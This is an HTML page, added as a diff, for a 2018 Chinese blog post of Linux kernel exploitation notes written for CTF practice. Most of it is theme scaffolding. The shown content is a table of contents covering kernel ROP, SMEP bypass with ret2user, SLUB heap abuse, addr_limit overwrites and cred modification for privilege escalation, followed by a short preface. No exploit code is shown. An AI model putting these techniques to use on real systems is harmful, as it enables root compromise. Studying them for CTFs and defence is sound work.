@@ -1,0 +1,1305 @@
+<!DOCTYPE html>
+<html style="display: none;" lang="zh">
+    <head>
+    <meta charset="utf-8">
+    <meta name="baidu-site-verification" content="RC70b8mZ9A" />
+    <meta name="msvalidate.01" content="325714A6172A8D425D843D8163893A54" />
+    <meta name="google-site-verification" content="QAmqP2zEYaSBqoZ9w1x5RdOflLW2Fir2-yVs5LTIUxA" />
+    <meta name="google-site-verification" content="QgUuEnRKG0PKdnDrOxnq55x7VxQbCiprrMJpfakMlow" />
+    <!--
+        © Material Theme
+        https://github.com/viosey/hexo-theme-material
+        Version: 1.5.0 -->
+    <script>
+        window.materialVersion = "1.5.0"
+        // Delete localstorage with these tags
+        window.oldVersion = [
+            'codestartv1',
+            '1.3.4',
+            '1.4.0',
+            '1.4.0b1'
+        ]
+    </script>
+
+
+    <!-- dns prefetch -->
+    <meta http-equiv="x-dns-prefetch-control" content="on">
+
+
+
+    <link rel="dns-prefetch" href="https://busuanzi.ibruce.info"/>
+
+
+
+        <link rel="dns-prefetch" href="https://cdn-city.livere.com"/>
+
+
+
+
+
+
+
+
+
+
+    <!-- Title -->
+    
+    <title>
+        
+            linux kernel pwn notes | 
+        
+        穷则变，变则通，通则久
+    </title>
+
+    <!-- Meta & Info -->
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="format-detection" content="telephone=no"/>
+    <meta name="theme-color" content="#0097A7">
+    <meta name="author" content="hac425">
+    <meta name="description" itemprop="description" content="">
+    <meta name="keywords" content=",ctf,kernel">
+
+    <!-- Import lsloader -->
+    <script>(function(){window.lsloader={jsRunSequence:[],jsnamemap:{},cssnamemap:{}};lsloader.removeLS=function(key){try{localStorage.removeItem(key)}catch(e){}};lsloader.setLS=function(key,val){try{localStorage.setItem(key,val)}catch(e){}};lsloader.getLS=function(key){var val="";try{val=localStorage.getItem(key)}catch(e){val=""}return val};versionString="/*"+(window.materialVersion||"unknownVersion")+"*/";lsloader.clean=function(){try{var keys=[];for(var i=0;i<localStorage.length;i++){keys.push(localStorage.key(i))}keys.forEach(function(key){var data=lsloader.getLS(key);if(window.oldVersion){var remove=window.oldVersion.reduce(function(p,c){return p||data.indexOf("/*"+c+"*/")!==-1},false);if(remove){lsloader.removeLS(key)}}})}catch(e){}};lsloader.clean();lsloader.load=function(jsname,jspath,cssonload,isJs){if(typeof cssonload==="boolean"){isJs=cssonload;cssonload=undefined}isJs=isJs||false;cssonload=cssonload||function(){};var code;code=this.getLS(jsname);if(code&&code.indexOf(versionString)===-1){this.removeLS(jsname);this.requestResource(jsname,jspath,cssonload,isJs);return}if(code){var versionNumber=code.split(versionString)[0];if(versionNumber!=jspath){console.log("reload:"+jspath);this.removeLS(jsname);this.requestResource(jsname,jspath,cssonload,isJs);return}code=code.split(versionString)[1];if(isJs){this.jsRunSequence.push({name:jsname,code:code});this.runjs(jspath,jsname,code)}else{document.getElementById(jsname).appendChild(document.createTextNode(code));cssonload()}}else{this.requestResource(jsname,jspath,cssonload,isJs)}};lsloader.requestResource=function(name,path,cssonload,isJs){var that=this;if(isJs){this.iojs(path,name,function(path,name,code){that.setLS(name,path+versionString+code);that.runjs(path,name,code)})}else{this.iocss(path,name,function(code){document.getElementById(name).appendChild(document.createTextNode(code));that.setLS(name,path+versionString+code)},cssonload)}};lsloader.iojs=function(path,jsname,callback){var that=this;that.jsRunSequence.push({name:jsname,code:""});try{var xhr=new XMLHttpRequest;xhr.open("get",path,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){callback(path,jsname,xhr.response);return}}that.jsfallback(path,jsname)}};xhr.send(null)}catch(e){that.jsfallback(path,jsname)}};lsloader.iocss=function(path,jsname,callback,cssonload){var that=this;try{var xhr=new XMLHttpRequest;xhr.open("get",path,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){callback(xhr.response);cssonload();return}}that.cssfallback(path,jsname,cssonload)}};xhr.send(null)}catch(e){that.cssfallback(path,jsname,cssonload)}};lsloader.iofonts=function(path,jsname,callback,cssonload){var that=this;try{var xhr=new XMLHttpRequest;xhr.open("get",path,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){callback(xhr.response);cssonload();return}}that.cssfallback(path,jsname,cssonload)}};xhr.send(null)}catch(e){that.cssfallback(path,jsname,cssonload)}};lsloader.runjs=function(path,name,code){if(!!name&&!!code){for(var k in this.jsRunSequence){if(this.jsRunSequence[k].name==name){this.jsRunSequence[k].code=code}}}if(!!this.jsRunSequence[0]&&!!this.jsRunSequence[0].code&&this.jsRunSequence[0].status!="failed"){var script=document.createElement("script");script.appendChild(document.createTextNode(this.jsRunSequence[0].code));script.type="text/javascript";document.getElementsByTagName("head")[0].appendChild(script);this.jsRunSequence.shift();if(this.jsRunSequence.length>0){this.runjs()}}else if(!!this.jsRunSequence[0]&&this.jsRunSequence[0].status=="failed"){var that=this;var script=document.createElement("script");script.src=this.jsRunSequence[0].path;script.type="text/javascript";this.jsRunSequence[0].status="loading";script.onload=function(){that.jsRunSequence.shift();if(that.jsRunSequence.length>0){that.runjs()}};document.body.appendChild(script)}};lsloader.tagLoad=function(path,name){this.jsRunSequence.push({name:name,code:"",path:path,status:"failed"});this.runjs()};lsloader.jsfallback=function(path,name){if(!!this.jsnamemap[name]){return}else{this.jsnamemap[name]=name}for(var k in this.jsRunSequence){if(this.jsRunSequence[k].name==name){this.jsRunSequence[k].code="";this.jsRunSequence[k].status="failed";this.jsRunSequence[k].path=path}}this.runjs()};lsloader.cssfallback=function(path,name,cssonload){if(!!this.cssnamemap[name]){return}else{this.cssnamemap[name]=1}var link=document.createElement("link");link.type="text/css";link.href=path;link.rel="stylesheet";link.onload=link.onerror=cssonload;var root=document.getElementsByTagName("script")[0];root.parentNode.insertBefore(link,root)};lsloader.runInlineScript=function(scriptId,codeId){var code=document.getElementById(codeId).innerText;this.jsRunSequence.push({name:scriptId,code:code});this.runjs()};lsloader.loadCombo=function(jslist){var updateList="";var requestingModules={};for(var k in jslist){var LS=this.getLS(jslist[k].name);if(!!LS){var version=LS.split(versionString)[0];var code=LS.split(versionString)[1]}else{var version=""}if(version==jslist[k].path){this.jsRunSequence.push({name:jslist[k].name,code:code,path:jslist[k].path})}else{this.jsRunSequence.push({name:jslist[k].name,code:null,path:jslist[k].path,status:"comboloading"});requestingModules[jslist[k].name]=true;updateList+=(updateList==""?"":";")+jslist[k].path}}var that=this;if(!!updateList){var xhr=new XMLHttpRequest;xhr.open("get",combo+updateList,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){that.runCombo(xhr.response,requestingModules);return}}else{for(var i in that.jsRunSequence){if(requestingModules[that.jsRunSequence[i].name]){that.jsRunSequence[i].status="failed"}}that.runjs()}}};xhr.send(null)}this.runjs()};lsloader.runCombo=function(comboCode,requestingModules){comboCode=comboCode.split("/*combojs*/");comboCode.shift();for(var k in this.jsRunSequence){if(!!requestingModules[this.jsRunSequence[k].name]&&!!comboCode[0]){this.jsRunSequence[k].status="comboJS";this.jsRunSequence[k].code=comboCode[0];this.setLS(this.jsRunSequence[k].name,this.jsRunSequence[k].path+versionString+comboCode[0]);comboCode.shift()}}this.runjs()}})();</script>
+
+    <!-- Import queue -->
+    <script>function Queue(){this.dataStore=[];this.offer=b;this.poll=d;this.execNext=a;this.debug=false;this.startDebug=c;function b(e){if(this.debug){console.log("Offered a Queued Function.")}if(typeof e==="function"){this.dataStore.push(e)}else{console.log("You must offer a function.")}}function d(){if(this.debug){console.log("Polled a Queued Function.")}return this.dataStore.shift()}function a(){var e=this.poll();if(e!==undefined){if(this.debug){console.log("Run a Queued Function.")}e()}}function c(){this.debug=true}}var queue=new Queue();</script>
+
+    <!-- Favicons -->
+    <link rel="icon shortcut" type="image/ico" href="/img/girl.png">
+    <link rel="icon" sizes="192x192" href="/img/girl.png">
+    <link rel="apple-touch-icon" href="/img/girl.png">
+
+    <!--iOS -->
+    <meta name="apple-mobile-web-app-title" content="Title">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="MobileOptimized" content="480">
+
+    <!-- Add to homescreen for Chrome on Android -->
+    <meta name="mobile-web-app-capable" content="yes">
+
+    <!-- Add to homescreen for Safari on iOS -->
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="apple-mobile-web-app-title" content="穷则变，变则通，通则久">
+
+    <!-- Site Verification -->
+    
+    
+
+    <!-- RSS -->
+    
+
+    <!--[if lte IE 9]>
+        <link rel="stylesheet" href="/css/ie-blocker.css">
+
+        
+            <script src="/js/ie-blocker.zhCN.js"></script>
+        
+    <![endif]-->
+
+    <!-- Import CSS -->
+    
+        <style id="material_css"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("material_css","/css/material.min.css?Z7a72R1E4SxzBKR/WGctOA==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
+        <style id="style_css"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("style_css","/css/style.min.css?MKetZV3cUTfDxvMffaOezg==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
+
+        
+
+    
+
+    
+
+    <!-- Config CSS -->
+
+<!-- Other Styles -->
+<style>
+  body, html {
+    font-family: Roboto, "Helvetica Neue", Helvetica, "PingFang SC", "Hiragino Sans GB", "Microsoft YaHei", "微软雅黑", Arial, sans-serif;
+    overflow-x: hidden !important;
+  }
+  
+  code {
+    font-family: Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace;
+  }
+
+  a {
+    color: #00838F;
+  }
+
+  .mdl-card__media,
+  #search-label,
+  #search-form-label:after,
+  #scheme-Paradox .hot_tags-count,
+  #scheme-Paradox .sidebar_archives-count,
+  #scheme-Paradox .sidebar-colored .sidebar-header,
+  #scheme-Paradox .sidebar-colored .sidebar-badge{
+    background-color: #0097A7 !important;
+  }
+
+  /* Sidebar User Drop Down Menu Text Color */
+  #scheme-Paradox .sidebar-colored .sidebar-nav>.dropdown>.dropdown-menu>li>a:hover,
+  #scheme-Paradox .sidebar-colored .sidebar-nav>.dropdown>.dropdown-menu>li>a:focus {
+    color: #0097A7 !important;
+  }
+
+  #post_entry-right-info,
+  .sidebar-colored .sidebar-nav li:hover > a,
+  .sidebar-colored .sidebar-nav li:hover > a i,
+  .sidebar-colored .sidebar-nav li > a:hover,
+  .sidebar-colored .sidebar-nav li > a:hover i,
+  .sidebar-colored .sidebar-nav li > a:focus i,
+  .sidebar-colored .sidebar-nav > .open > a,
+  .sidebar-colored .sidebar-nav > .open > a:hover,
+  .sidebar-colored .sidebar-nav > .open > a:focus,
+  #ds-reset #ds-ctx .ds-ctx-entry .ds-ctx-head a {
+    color: #0097A7 !important;
+  }
+
+  .toTop {
+    background: #757575 !important;
+  }
+
+  .material-layout .material-post>.material-nav,
+  .material-layout .material-index>.material-nav,
+  .material-nav a {
+    color: #757575;
+  }
+
+  #scheme-Paradox .MD-burger-layer {
+    background-color: #757575;
+  }
+
+  #scheme-Paradox #post-toc-trigger-btn {
+    color: #757575;
+  }
+
+  .post-toc a:hover {
+    color: #00838F;
+    text-decoration: underline;
+  }
+
+</style>
+
+
+<!-- Theme Background Related-->
+
+    <style>
+      body{
+        background-color: #F5F5F5;
+      }
+
+      /* blog_info bottom background */
+      #scheme-Paradox .material-layout .something-else .mdl-card__supporting-text{
+        background-color: #fff;
+      }
+    </style>
+
+
+
+
+<!-- Fade Effect -->
+
+    <style>
+      .fade {
+        transition: all 800ms linear;
+        -webkit-transform: translate3d(0,0,0);
+        -moz-transform: translate3d(0,0,0);
+        -ms-transform: translate3d(0,0,0);
+        -o-transform: translate3d(0,0,0);
+        transform: translate3d(0,0,0);
+        opacity: 1;
+      }
+
+      .fade.out{
+        opacity: 0;
+      }
+    </style>
+
+
+<!-- Import Font -->
+<!-- Import Roboto -->
+
+    <link href="https://fonts.googleapis.com/css?family=Roboto:300,400,500" rel="stylesheet">
+
+
+<!-- Import Material Icon -->
+
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+
+
+
+
+    <!-- Import jQuery -->
+    
+        <script>lsloader.load("jq_js","/js/jquery.min.js?ezyEvm8ST5CGfpA+kFFi1g==", true)</script>
+    
+
+    <!-- The Open Graph protocol -->
+    <meta property="og:url" content="http://blog.hac425.top">
+    <meta property="og:type" content="blog">
+    <meta property="og:title" content="linux kernel pwn notes | 穷则变，变则通，通则久">
+    <meta property="og:image" content="http://blog.hac425.top/img/girl.png" />
+    <meta property="og:description" content="">
+    <meta property="og:article:tag" content="ctf"> <meta property="og:article:tag" content="kernel"> 
+
+    
+        <meta property="article:published_time" content="Sun Apr 29 2018 19:33:00 GMT+0800" />
+        <meta property="article:modified_time" content="Mon Apr 30 2018 13:58:13 GMT+0800" />
+    
+
+    <!-- The Twitter Card protocol -->
+    <meta name="twitter:title" content="linux kernel pwn notes | 穷则变，变则通，通则久">
+    <meta name="twitter:description" content="">
+    <meta name="twitter:image" content="http://blog.hac425.top/img/girl.png">
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:url" content="http://blog.hac425.top" />
+
+    <!-- Add canonical link for SEO -->
+    
+        <link rel="canonical" href="http://blog.hac425.top/2018/04/29/linux_kernel_pwn_notes.html" />
+    
+
+    <!-- Structured-data for SEO -->
+    
+        
+
+
+<script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "BlogPosting",
+    "mainEntityOfPage": "http://blog.hac425.top/2018/04/29/linux_kernel_pwn_notes.html",
+    "headline": "linux kernel pwn notes",
+    "datePublished": "Sun Apr 29 2018 19:33:00 GMT+0800",
+    "dateModified": "Mon Apr 30 2018 13:58:13 GMT+0800",
+    "author": {
+        "@type": "Person",
+        "name": "hac425",
+        "image": {
+            "@type": "ImageObject",
+            "url": "/img/girl.png"
+        },
+        "description": "纵横捭阖，冷心为上"
+    },
+    "publisher": {
+        "@type": "Organization",
+        "name": "穷则变，变则通，通则久",
+        "logo": {
+            "@type":"ImageObject",
+            "url": "/img/girl.png"
+        }
+    },
+    "keywords": ",ctf,kernel",
+    "description": "",
+}
+</script>
+
+
+    
+
+    <!-- Analytics -->
+    
+    
+        <script>
+    var _hmt = _hmt || [];
+    (function() {var hm = document.createElement('script');
+    hm.src = 'https://hm.baidu.com/hm.js?99747687c69d73d9102f032f78f03e96';
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+    
+    
+
+    <!-- Custom Head -->
+    
+
+</head>
+
+
+    
+        <body id="scheme-Paradox" class="lazy">
+            <div class="material-layout  mdl-js-layout has-drawer is-upgraded">
+                
+
+                <!-- Main Container -->
+                <main class="material-layout__content" id="main">
+
+                    <!-- Top Anchor -->
+                    <div id="top"></div>
+
+                    
+                        <!-- Hamburger Button -->
+                        <button class="MD-burger-icon sidebar-toggle">
+                            <span class="MD-burger-layer"></span>
+                        </button>
+                    
+
+                    <!-- Post TOC -->
+
+    
+    <!-- Back Button -->
+    <!--
+    <div class="material-back" id="backhome-div" tabindex="0">
+        <a class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon"
+           href="#" onclick="window.history.back();return false;"
+           target="_self"
+           role="button"
+           data-upgraded=",MaterialButton,MaterialRipple">
+            <i class="material-icons" role="presentation">arrow_back</i>
+            <span class="mdl-button__ripple-container">
+                <span class="mdl-ripple"></span>
+            </span>
+        </a>
+    </div>
+    -->
+
+
+    <!-- Left aligned menu below button -->
+    
+    
+    <button id="post-toc-trigger-btn"
+        class="mdl-button mdl-js-button mdl-button--icon">
+        <i class="material-icons">format_list_numbered</i>
+    </button>
+
+    <ul class="post-toc-wrap mdl-menu mdl-menu--bottom-left mdl-js-menu mdl-js-ripple-effect" for="post-toc-trigger-btn" style="max-height:80vh; overflow-y:scroll;">
+        <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#前言"><span class="post-toc-number">1.</span> <span class="post-toc-text">前言</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#环境搭建"><span class="post-toc-number">2.</span> <span class="post-toc-text">环境搭建</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#编译内核"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">编译内核</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#编译-busybox-amp-amp-构建文件系统"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">编译 busybox && 构建文件系统</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#编译-busybox"><span class="post-toc-number">2.2.1.</span> <span class="post-toc-text">编译 busybox</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#编译的一些配置"><span class="post-toc-number">2.2.2.</span> <span class="post-toc-text">编译的一些配置</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#内核模块创建与调试"><span class="post-toc-number">3.</span> <span class="post-toc-text">内核模块创建与调试</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#创建内核模块"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">创建内核模块</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#gdb调试"><span class="post-toc-number">3.2.</span> <span class="post-toc-text">gdb调试</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#利用方式汇总"><span class="post-toc-number">4.</span> <span class="post-toc-text">利用方式汇总</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#内核-Rop"><span class="post-toc-number">4.1.</span> <span class="post-toc-text">内核 Rop</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Rop-By-栈溢出"><span class="post-toc-number">4.1.1.</span> <span class="post-toc-text">Rop-By-栈溢出</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#准备工作"><span class="post-toc-number">4.1.1.1.</span> <span class="post-toc-text">准备工作</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#漏洞"><span class="post-toc-number">4.1.1.2.</span> <span class="post-toc-text">漏洞</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#利用"><span class="post-toc-number">4.1.1.3.</span> <span class="post-toc-text">利用</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#利用-rop-直接提权"><span class="post-toc-number">4.1.1.3.1.</span> <span class="post-toc-text">利用 rop 直接提权</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#利用-rop-关闭-smep-amp-amp-ret2user"><span class="post-toc-number">4.1.1.3.2.</span> <span class="post-toc-text">利用 rop 关闭 smep && ret2user</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Rop-By-Heap-Vulnerability"><span class="post-toc-number">4.1.2.</span> <span class="post-toc-text">Rop-By-Heap-Vulnerability</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#漏洞-1"><span class="post-toc-number">4.1.2.1.</span> <span class="post-toc-text">漏洞</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#利用-1"><span class="post-toc-number">4.1.2.2.</span> <span class="post-toc-text">利用</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#slub简述"><span class="post-toc-number">4.1.2.2.1.</span> <span class="post-toc-text">slub简述</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#代码执行"><span class="post-toc-number">4.1.2.2.2.</span> <span class="post-toc-text">代码执行</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#rop"><span class="post-toc-number">4.1.2.2.3.</span> <span class="post-toc-text">rop</span></a></li></ol></li></ol></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#利用-thread-info-gt-addr-limit"><span class="post-toc-number">4.2.</span> <span class="post-toc-text">利用 thread_info->addr_limit</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#DEMO"><span class="post-toc-number">4.2.1.</span> <span class="post-toc-text">DEMO</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#利用栈地址拿到-thread-info-的地址"><span class="post-toc-number">4.2.1.1.</span> <span class="post-toc-text">利用栈地址拿到 thread_info 的地址</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#修改-thread-info-gt-addr-limit"><span class="post-toc-number">4.2.1.2.</span> <span class="post-toc-text">修改 thread_info->addr_limit</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#利用-pipe-实现任意地址读写"><span class="post-toc-number">4.2.1.3.</span> <span class="post-toc-text">利用 pipe 实现任意地址读写</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#修改-task-struct-gt-real-cred"><span class="post-toc-number">4.2.1.4.</span> <span class="post-toc-text">修改 task_struct->real_cred</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#利用-set-fs"><span class="post-toc-number">4.2.2.</span> <span class="post-toc-text">利用 set_fs</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#修改-cred提权"><span class="post-toc-number">4.3.</span> <span class="post-toc-text">修改 cred提权</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#介绍"><span class="post-toc-number">4.3.1.</span> <span class="post-toc-text">介绍</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#堆溢出为例"><span class="post-toc-number">4.3.2.</span> <span class="post-toc-text">堆溢出为例</span></a></li></ol></li></ol></li></ol>
+    </ul>
+    
+
+
+
+
+<!-- Layouts -->
+
+    <!-- Post Module -->
+    <div class="material-post_container">
+
+        <div class="material-post mdl-grid">
+            <div class="mdl-card mdl-shadow--4dp mdl-cell mdl-cell--12-col">
+
+                <!-- Post Header(Thumbnail & Title) -->
+                
+    <!-- Paradox Post Header -->
+    
+        
+            <!-- Random Thumbnail -->
+            <div class="post_thumbnail-random mdl-card__media mdl-color-text--grey-50">
+            <script type="text/ls-javascript" id="post-thumbnail-script">
+    var randomNum = Math.floor(Math.random() * 19 + 1);
+
+    $('.post_thumbnail-random').attr('data-original', '/img/random/material-' + randomNum + '.png');
+    $('.post_thumbnail-random').addClass('lazy');
+</script>
+
+        
+    
+            <p class="article-headline-p">
+                linux kernel pwn notes
+            </p>
+        </div>
+
+
+
+
+
+                
+                    <!-- Paradox Post Info -->
+                    <div class="mdl-color-text--grey-700 mdl-card__supporting-text meta">
+
+    <!-- Author Avatar -->
+    <div id="author-avatar">
+        <img src="/img/girl.png" width="44px" height="44px" alt="Author Avatar"/>
+    </div>
+    <!-- Author Name & Date -->
+    <div>
+        <strong>hac425</strong>
+        <span>4月 29, 2018</span>
+    </div>
+
+    <div class="section-spacer"></div>
+
+    <!-- Favorite -->
+    <!--
+        <button id="article-functions-like-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon btn-like">
+            <i class="material-icons" role="presentation">favorite</i>
+            <span class="visuallyhidden">favorites</span>
+        </button>
+    -->
+
+    <!-- Qrcode -->
+    
+        <button id="article-functions-qrcode-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
+    <i class="material-icons" role="presentation">devices other</i>
+    <span class="visuallyhidden">devices other</span>
+</button>
+<ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-qrcode-button">
+    <li class="mdl-menu__item">在其它设备中阅读本文章</li>
+    
+        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACaklEQVR42u3aUa6DMAwEwN7/0u8doBLsxpDSavJVVUA9fMSu49ffT68XHh4eHh4eHh7ew3iveB3f9f79+/XJvRfEhoeHh7eFd7LVHl6TINsXNIkNDw8Pbycv/8nJSzne3JPfPXlxeHh4eI/kHSeGJNC1JIGHh4f3vbykKTDB4OHh4X0LLymO72jUJulkU68FDw8PL+blh0z7P28938PDw8MLePVIU5AYkoOxvCgfDV3h4eHh3cBbazTMr8zbE+2LwMPDw7ubl7cS8oGAJKm0jYlinAsPDw/vAby1MroFrzUsLkgMeHh4eCUvKWfzlNCOXhVB58MKeHh4eFt4eeP1quJ40tRYnIzAw8PDu4jXbvHJANbaaEKehE7AeHh4eB/lnRSv5VFWniqOIzx5Ah4eHt7NvEn7YK1lMEkPo8kIPDw8vIt4a9txTq2bsGXhXo8O4OHh4Y15bet2smVPmsVF4sHDw8Pbwkt+/q9c+V1tDBf8Y8DDw8Mb89YSQF5St83itXSFh4eHt5PXHkq1A1hJ6G2qqPMeHh4e3qW89nFt62FyVFZ/g4eHh7eF135uW7rtS2wLbjw8PLzP8tqj+jxt5AMEa4kEDw8P71O8tQI6SSSTgdciqeDh4eHdzJsMBKwNGaw9oWgc4+Hh4d3Me8WrLa8nwwF5c6Q4AMPDw8O7lNdu5fkhWd6wyJ9WJwY8PDy823jJSGjesLgq9PYYDA8PD++ZvKLAHYS+OHaAh4eH92BeHmKSYCbDW3h4eHif4iWb+1pAd48R4OHh4e3nzYvdpEmRJIZ26AoPDw9vP+/3Fh4eHh4eHh4e3gPWPxihFhE+gWASAAAAAElFTkSuQmCC">
+    
+</ul>
+
+    
+
+    <!-- Tags (bookmark) -->
+    
+    <button id="article-functions-viewtags-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
+        <i class="material-icons" role="presentation">bookmark</i>
+        <span class="visuallyhidden">bookmark</span>
+    </button>
+    <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-viewtags-button">
+        <li class="mdl-menu__item">
+        <a class="post_tag-link" href="/tags/ctf/">ctf</a></li><li class="mdl-menu__item"><a class="post_tag-link" href="/tags/kernel/">kernel</a>
+    </ul>
+    
+
+    <!-- Share -->
+    <button id="article-fuctions-share-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
+    <i class="material-icons" role="presentation">share</i>
+    <span class="visuallyhidden">share</span>
+</button>
+<ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-fuctions-share-button">
+    
+
+    
+        
+            <!-- Busuanzi Views -->
+            <a class="post_share-link" href="#">
+                <li class="mdl-menu__item">
+                    <span id="busuanzi_container_page_pv">
+                        <span id="busuanzi_value_page_pv"></span>&nbsp;浏览量
+                    </span>
+                </li>
+            </a>
+        
+    
+
+    <!-- Share Weibo -->
+    
+        <a class="post_share-link" href="http://service.weibo.com/share/share.php?appkey=&title=linux kernel pwn notes&url=http://blog.hac425.top/2018/04/29/linux_kernel_pwn_notes.html&pic=http://blog.hac425.top/img/girl.png&searchPic=false&style=simple" target="_blank">
+            <li class="mdl-menu__item">
+                分享到微博
+            </li>
+        </a>
+    
+
+    <!-- Share Twitter -->
+    
+        <a class="post_share-link" href="https://twitter.com/intent/tweet?text=linux kernel pwn notes&url=http://blog.hac425.top/2018/04/29/linux_kernel_pwn_notes.html&via=hac425" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Twitter
+            </li>
+        </a>
+    
+
+    <!-- Share Facebook -->
+    
+        <a class="post_share-link" href="https://www.facebook.com/sharer/sharer.php?u=http://blog.hac425.top/2018/04/29/linux_kernel_pwn_notes.html" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Facebook
+            </li>
+        </a>
+    
+
+    <!-- Share Google+ -->
+    
+        <a class="post_share-link" href="https://plus.google.com/share?url=http://blog.hac425.top/2018/04/29/linux_kernel_pwn_notes.html" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Google+
+            </li>
+        </a>
+    
+
+    <!-- Share LinkedIn -->
+    
+
+    <!-- Share QQ -->
+    
+
+    <!-- Share Telegram -->
+    
+</ul>
+
+</div>
+
+                
+
+                <!-- Post Content -->
+                <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
+    
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>对这段时间学习的 <code>linux</code> 内核中的一些简单的利用技术做一个记录，如有差错，请见谅。</p>
+<p>相关的文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://gitee.com/hac425/kernel_ctf</div></pre></td></tr></table></figure>
+<p>相关引用已在文中进行了标注，如有遗漏，请提醒。</p>
